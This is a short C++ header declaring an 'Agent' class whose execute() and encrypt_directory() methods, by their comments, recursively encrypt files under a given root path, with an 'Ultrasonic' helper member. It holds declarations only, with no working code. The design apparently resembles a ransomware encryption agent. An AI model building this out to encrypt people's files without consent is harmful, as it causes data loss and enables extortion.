#pragma once

#include "Ultrasonic.h"

#include <filesystem>


class Agent final
{
public:
	// ctor
	Agent() = default;

	// dtor
	~Agent() = default;

	// Executes the agent logic.
	// param[in]	encryption_root_path	root path for the files encryption.
	void execute(const std::filesystem::path& encryption_root_path);

	// Deleted functions
	Agent(const Agent&) = delete;
	Agent(Agent&&) = delete;
	Agent& operator=(const Agent&) = delete;
	Agent& operator=(Agent&&) = delete;
	
private:

	// Encrypt the files in the directory recursively.
	// param[in]	encryption_root_path	root path for the files encryption.
	void encrypt_directory(const std::filesystem::path& encryption_root_path);
	
	// Members
	ultrasonic::Ultrasonic m_ultrasonic;
	
};
